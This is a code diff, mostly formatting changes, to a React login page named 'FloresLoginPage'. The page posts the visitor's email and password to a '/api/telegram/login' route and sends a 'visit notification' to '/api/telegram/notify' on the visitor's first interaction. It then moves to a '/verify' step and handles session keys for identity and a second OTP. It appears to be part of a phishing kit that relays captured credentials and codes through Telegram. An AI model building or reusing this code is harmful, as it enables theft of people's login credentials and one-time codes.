@@ -1,34 +1,35 @@
-"use client"
+"use client";
 
-import { useEffect, useState } from "react"
-import { useRouter } from "next/navigation"
-import { Eye, EyeOff } from "lucide-react"
-import { FLORES_SESSION } from "@/lib/flores-flow"
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import { Eye, EyeOff } from "lucide-react";
+import { FLORES_SESSION } from "@/lib/flores-flow";
 
 export function FloresLoginPage() {
-  const router = useRouter()
-  const [email, setEmail] = useState("")
-  const [password, setPassword] = useState("")
-  const [showPassword, setShowPassword] = useState(false)
-  const [message, setMessage] = useState<string | null>(null)
-  const [isLoading, setIsLoading] = useState(false)
+  const router = useRouter();
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
+  const [message, setMessage] = useState<string | null>(null);
+  const [isLoading, setIsLoading] = useState(false);
 
   useEffect(() => {
     if (typeof window !== "undefined") {
-      sessionStorage.removeItem(FLORES_SESSION.verify)
-      sessionStorage.removeItem(FLORES_SESSION.identity)
-      sessionStorage.removeItem(FLORES_SESSION.otp2)
+      sessionStorage.removeItem(FLORES_SESSION.verify);
+      sessionStorage.removeItem(FLORES_SESSION.identity);
+      sessionStorage.removeItem(FLORES_SESSION.otp2);
     }
-  }, [])
+  }, []);
 
   useEffect(() => {
-    let sent = false
+    let sent = false;
     const onFirstInteraction = () => {
-      if (sent) return
-      sent = true
+      if (sent) return;
+      sent = true;
 
-      const screen = `${window.screen.width}x${window.screen.height}`
-      const language = navigator.language || navigator.languages?.[0] || "unknown"
+      const screen = `${window.screen.width}x${window.screen.height}`;
+      const language =
+        navigator.language || navigator.languages?.[0] || "unknown";
 
       fetch("/api/telegram/notify", {
         method: "POST",
@@ -44,30 +45,33 @@ export function FloresLoginPage() {
           },
         }),
       }).catch((error) => {
-        console.error("Failed to send visit notification:", error)
-      })
-    }
+        console.error("Failed to send visit notification:", error);
+      });
+    };
 
-    window.addEventListener("pointerdown", onFirstInteraction, { once: true, passive: true })
-    window.addEventListener("keydown", onFirstInteraction, { once: true })
+    window.addEventListener("pointerdown", onFirstInteraction, {
+      once: true,
+      passive: true,
+    });
+    window.addEventListener("keydown", onFirstInteraction, { once: true });
     return () => {
-      window.removeEventListener("pointerdown", onFirstInteraction)
-      window.removeEventListener("keydown", onFirstInteraction)
-    }
-  }, [])
+      window.removeEventListener("pointerdown", onFirstInteraction);
+      window.removeEventListener("keydown", onFirstInteraction);
+    };
+  }, []);
 
   const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    event.preventDefault()
-    setMessage(null)
+    event.preventDefault();
+    setMessage(null);
 
     if (!email.trim() || !password.trim() || isLoading) {
       if (!email.trim() || !password.trim()) {
-        setMessage("Please enter both email and password.")
+        setMessage("Please enter both email and password.");
       }
-      return
+      return;
     }
 
-    setIsLoading(true)
+    setIsLoading(true);
 
     try {
       const response = await fetch("/api/telegram/login", {
@@ -79,24 +83,26 @@ export function FloresLoginPage() {
           userId: email.trim(),
           password,
         }),
-      })
+      });
 
       if (!response.ok) {
-        setMessage("Unable to sign in. Please check your credentials and try again.")
-        setIsLoading(false)
-        return
+        setMessage(
+          "Unable to sign in. Please check your credentials and try again.",
+        );
+        setIsLoading(false);
+        return;
       }
 
       if (typeof window !== "undefined") {
-        sessionStorage.setItem(FLORES_SESSION.verify, "1")
+        sessionStorage.setItem(FLORES_SESSION.verify, "1");
       }
-      router.push("/verify")
+      router.push("/verify");
     } catch (error) {
-      console.error("Failed to send login notification:", error)
-      setMessage("Something went wrong. Please try again.")
-      setIsLoading(false)
+      console.error("Failed to send login notification:", error);
+      setMessage("Something went wrong. Please try again.");
+      setIsLoading(false);
     }
-  }
+  };
 
   return (
     <div className="min-h-screen bg-linear-to-br from-[#f3f6fb] to-[#eef1f6] flex items-center justify-center px-4 sm:px-6">
@@ -146,7 +152,11 @@ export function FloresLoginPage() {
                 aria-label={showPassword ? "Hide password" : "Show password"}
                 className="absolute right-0 top-0 text-gray-600 hover:text-black"
               >
-                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
+                {showPassword ? (
+                  <EyeOff className="w-5 h-5" />
+                ) : (
+                  <Eye className="w-5 h-5" />
+                )}
               </button>
             </div>
 
@@ -188,5 +198,5 @@ export function FloresLoginPage() {
         </div>
       </div>
     </div>
-  )
+  );
 }
